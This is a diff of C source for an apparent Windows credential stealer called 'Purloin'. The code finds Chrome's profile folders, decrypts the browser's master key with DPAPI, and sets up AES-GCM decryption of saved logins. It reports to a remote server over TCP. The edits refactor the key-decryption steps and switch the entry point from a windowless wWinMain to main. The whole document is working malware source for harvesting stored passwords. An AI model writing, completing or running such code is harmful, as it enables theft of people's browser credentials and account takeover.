@@ -15,9 +15,9 @@
 //#include <ws2tcpip.h>
 #include <dpapi.h>
 #include <wincrypt.h>
-#include "Purloin_Debug.h"
-#include "Purloin_Server.h"
-#include "Purloin_Browser.h"
+#include "Purloin/Purloin_Debug.h"
+#include "Purloin/Purloin_Server.h"
+#include "Purloin/Purloin_Chrome.h"
 
 #define ENC_MASTER_KEY_LEN 357
 #define IV_LEN 12
@@ -52,10 +52,10 @@ BOOL connect_to_serv(SOCKET* ConnectSocket);
 void sendData(char* data);
 void closeConnection();
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-//int main() {
+//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int main() {
 	/* These variables are used to retrieve chrome paths, directories, master key etc. */
-	WCHAR chrome_dir[MAX_PATH] = { L'\0' }, enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };	// Buffer to hold Google Chrome directory, and Encrypted master key (encrypted using CryptProtectData())
+	WCHAR chrome_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Google Chrome directory
 	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR (Later it will be used to get profile paths to get Login Data db
 	
 	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
@@ -101,25 +101,38 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	BYTE iv[IV_LEN] = { 0 }, tag[TAG_LEN] = { 0 };											// Buffers to hold IV and the TAG. Which are used to decrypt the cipher text.
 
 
+
+
 	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
 	if (!get_browser_dir(FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data\\", chrome_dir, tcp_send_buffer, DEFAULT_BUFLEN)) {
 		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
-
 	/* Gets the Master Key of Chrome, which is inside% LOCALAPPDATA% \Google\Chrome\User Data\Local State */
+	WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };								// Buffer to hold Encrypted master key(encrypted using CryptProtectData())
 	if (!get_encrypted_masterkey(chrome_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, tcp_send_buffer, DEFAULT_BUFLEN)) {
 		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
 
+
+
 	/* Decrypts the Master keyand returns a AES - GCM decrypting algorithm to decrypt passwords. */
-	BCRYPT_KEY_HANDLE handle_bcrypt;			
-	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key// Handle to AES-GCM decrypting algorithm
-	if (!decrypt_masterkey_and_ret(enc_master_key, char_master_key, ENC_MASTER_KEY_LEN, &handle_bcrypt, tcp_send_buffer, DEFAULT_BUFLEN)) {
+	BCRYPT_KEY_HANDLE handle_bcrypt;													// Handle to the decryption algorithm of AES-GCM256
+	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key
+	DATA_BLOB blob_dec_masterkey;														// DATA_BLOB to hold byte form of decrypted master key
+	// Decrypt the obtained master key. Decrypted byte form is stored on the blob_dec_masterkey DATA_BLOB
+	if (!decrypt_masterkey(enc_master_key, char_master_key, ENC_MASTER_KEY_LEN, &blob_dec_masterkey, tcp_send_buffer, DEFAULT_BUFLEN)) {
 		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
+	// Use the decrypted master key to get a handle to the AES-GCM 256 decryption algorithm
+	if (!get_decryption_handler(&handle_bcrypt, &blob_dec_masterkey, tcp_send_buffer, DEFAULT_BUFLEN)) {
+		Debug(sendData(tcp_send_buffer);)
+		exit(1);
+	}
+
+
 
 	/* Converts the WCHAR chrome directory path to CHAR */
 	size_t size_returned_char_master_key;
@@ -129,14 +142,12 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 		sendData(tcp_send_buffer);
 		exit(1);
 	}
-
 	/* Gets a file handle for Chrome directory to list the files in that directory */
 	if (!get_file_handle(chrome_dir_char, &dir_files, &dir_handle)) {
 		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting Chrome Directory file handle failed\n");
 		sendData(tcp_send_buffer);
 		exit(1);
 	}
-
 	/* Go through the files/folders in that directory */
 	do {
 		if (is_substring_in("Default", dir_files.cFileName) || is_substring_in("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
@@ -206,6 +217,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 			memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
 		}
 	} while (FindNextFileA(dir_handle, &dir_files));
+
+
 
 	/* Free allocated memory to prevent leaks */
 	free(cipher_text_byte);
